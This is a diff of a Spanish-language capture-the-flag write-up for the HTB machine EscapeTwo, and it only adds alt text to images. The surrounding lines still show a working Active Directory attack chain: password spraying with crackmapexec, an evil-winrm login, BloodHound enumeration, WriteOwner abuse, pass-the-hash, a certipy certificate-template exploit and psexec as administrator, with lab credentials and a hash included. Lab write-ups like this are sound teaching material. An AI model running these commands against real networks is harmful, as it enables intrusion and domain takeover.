@@ -127,7 +127,7 @@ smbclient //sequel.htb/'Accounting Department' -U rose
 
 luego de mirar y buscar por todo el contenido de "users" encontré algo bueno en  "accounting department":
 
-<img src="/images/writeup-escapetwo/Pasted image 20250504215013.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250504215013.png" alt="image">
 
 los archivos xlsx son archivos comprimidos asi que:
 ```bash
@@ -224,7 +224,7 @@ nc -lnvp 4444
 
 si no se ejecuta, hay que hacer el proceso de nuevo, porque se restablece la configuración de ejecución de comandos
 
-<img src="/images/writeup-escapetwo/Pasted image 20250505103552.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250505103552.png" alt="image">
 
 para empezar a enumerar el sistema, fui hasta la raiz y alli vi un directorio \SQL2019 , dentro hay otro directorio que si lo visitamos veremos:
 ```powershell
@@ -292,17 +292,17 @@ PYTHONWARNINGS=ignore crackmapexec  winrm 10.129.2.83 -u /usr/share/wordlists/se
 ```
 
 ignorando las advertencias tenemos:
-<img src="/images/writeup-escapetwo/Pasted image 20250505114419.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250505114419.png" alt="image">
 tenemos a un usuario ryan
 
 usando el comando:
 ```bash
 evil-winrm -i 10.129.2.83 -u ryan -p WqSZAF6CysDQbGb3
 ```
-<img src="/images/writeup-escapetwo/Pasted image 20250505114613.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250505114613.png" alt="image">
 
 finalmente tenemos un usuario con permiso de ejecución remota y en el directorio /Desktop esta la flag del usuario:
-<img src="/images/writeup-escapetwo/Pasted image 20250505114820.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250505114820.png" alt="image">
 
 para recolectar información desde nuestro equipo, podemos usar la herramienta bloodhound-python:
 
@@ -321,7 +321,7 @@ y dentro de un directorio (porque creara muchos archivos) ejecutar:
 bloodhound-python -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.10.10.10  -c all
 ```
 
-<img src="/images/writeup-escapetwo/Pasted image 20250506104337.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506104337.png" alt="image">
 
 vamos a correr en la terminal:
 ```bash
@@ -332,22 +332,22 @@ y en nuestro localhost:8080 veremos la interface de inicio de sesion, alli vamos
 
 buscaremos en la pestana "explore" el nombre del usuario que ya tenemos para conectarnos:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250506214329.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506214329.png" alt="image">
 
 vamos a añadirlo como usuario "owned" con click derecho:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250506214429.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506214429.png" alt="image">
 
 y en la pestana izquierda veremos que permisos, ventajas y demas tiene este usuario para buscar la forma de escalar privilegios
 
-<img src="/images/writeup-escapetwo/Pasted image 20250506214709.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506214709.png" alt="image">
 
 vemos que somos miembro de 4 grupos:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250506214831.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506214831.png" alt="image">
 
 si miramos mas al usuario ryan, veremos que  en la seccion outbound object control, tenemos permisos *writeOwner* sobre el usuario: CA_SVC
-<img src="/images/writeup-escapetwo/Pasted image 20250506215655.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250506215655.png" alt="image">
 
 investigando, ese permiso nos permite hacernos propietarios de la cuenta de ese usuario, para modificar permisos y darnos control total  y asi resetear su contraseña e iniciar sesión como ese usuario
 
@@ -448,7 +448,7 @@ para validar la autenticacion en el sistema con el hash ntlm usaremos (recuerda 
 netexec smb 10.129.231.236 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-<img src="/images/writeup-escapetwo/Pasted image 20250507083108.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507083108.png" alt="image">
 
 finalmente tenemos un otro usuario autenticado pero no tenemos permisos para conectarnos con rdp o winrm
 
@@ -484,11 +484,11 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 si miramos el archivo de salida .json vemos al final del todo:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250507090815.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507090815.png" alt="image">
 la vulnerabilidad que podremos explotar con este usuario! en la plantilla de certificado "DunderMifflinAuthentication"
 
 aunque esta plantilla tiene una limitacion, y es que no podemos agregar un SAN arbitrario porque enrolle supplies subject es false:
-<img src="/images/writeup-escapetwo/Pasted image 20250507093222.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507093222.png" alt="image">
 
 para explotar esto, vamos primero a modificar la plantilla 
 
@@ -513,7 +513,7 @@ certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2
 
 eso nos deja un archivo .pfx:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250507100056.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507100056.png" alt="image">
 
 que usaremos para tener un hash como administrador:
 ```bash
@@ -527,7 +527,7 @@ con esto, nos dará el hash y lo almacenara directamente en una variable, asi qu
 export KRB5CCNAME=administrator.ccache
 ```
 
-<img src="/images/writeup-escapetwo/Pasted image 20250507101057.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507101057.png" alt="image">
 
 uso psexec.py para autenticarme:
 ```bash
@@ -536,7 +536,7 @@ psexec.py -k -no-pass sequel.htb/administrator@DC01.sequel.htb
 
 y somos admin:
 
-<img src="/images/writeup-escapetwo/Pasted image 20250507101224.png">
+<img src="/images/writeup-escapetwo/Pasted image 20250507101224.png" alt="image">
 
 realmente pienso que esta maquina es mas como media (debemos hacer mas active directory)
 
@@ -547,4 +547,4 @@ nos vemos en la siguiente maquina!
 
 ## H4ck th3 W0rld<
 
-<img src="/images/devil.jpg" style="border-radius:200px; width:100px;">
+<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">
